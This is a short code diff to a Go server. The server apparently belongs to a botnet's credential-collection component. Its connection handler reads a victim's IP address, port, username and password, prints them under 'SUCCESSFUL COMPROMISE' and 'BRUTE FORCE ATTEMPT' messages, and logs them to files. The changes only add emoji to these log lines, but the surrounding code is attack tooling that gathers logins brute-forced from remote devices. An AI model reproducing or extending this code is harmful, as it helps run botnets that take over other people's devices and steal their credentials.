@@ -67,14 +67,14 @@ func handleConnection(conn net.Conn) {
         fmt.Printf("🔍 Processing brute force attempt...\n")
         ipBuf, err := readXBytes(conn, 4)
         if err != nil {
-            fmt.Printf("Failed to read IP: %v\n", err)
+            fmt.Printf("❌ Failed to read IP: %v\n", err)
             return
         }
         ipInt = binary.BigEndian.Uint32(ipBuf)
 
         portBuf, err := readXBytes(conn, 2)
         if err != nil {
-            fmt.Printf("Failed to read port: %v\n", err)
+            fmt.Printf("❌ Failed to read port: %v\n", err)
             return
         }
 
@@ -836,7 +836,7 @@ func handleConnection(conn net.Conn) {
     defer file.Close()
     
     ipStr := fmt.Sprintf("%d.%d.%d.%d", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff)
-    fmt.Printf("SUCCESSFUL COMPROMISE: %s:%d %s:%s\n", ipStr, portInt, string(usernameBuf), string(passwordBuf))
+    fmt.Printf("🎯 SUCCESSFUL COMPROMISE: %s:%d %s:%s\n", ipStr, portInt, string(usernameBuf), string(passwordBuf))
 
     fmt.Fprintf(file, "%d.%d.%d.%d:%d %s:%s\n", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff, portInt, string(usernameBuf), string(passwordBuf))
 }
@@ -858,7 +858,7 @@ func readXBytes(conn net.Conn, amount int) ([]byte, error) {
 
 func handleBruteAttempt(ipInt uint32, portInt uint16) {
     ipStr := fmt.Sprintf("%d.%d.%d.%d", (ipInt>>24)&0xff, (ipInt>>16)&0xff, (ipInt>>8)&0xff, ipInt&0xff)
-    fmt.Printf("BRUTE FORCE ATTEMPT: %s:%d\n", ipStr, portInt)
+    fmt.Printf("🔍 BRUTE FORCE ATTEMPT: %s:%d\n", ipStr, portInt)
     
     // Log brute attempts to a separate file
     file, err := os.OpenFile("brute_attempts.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
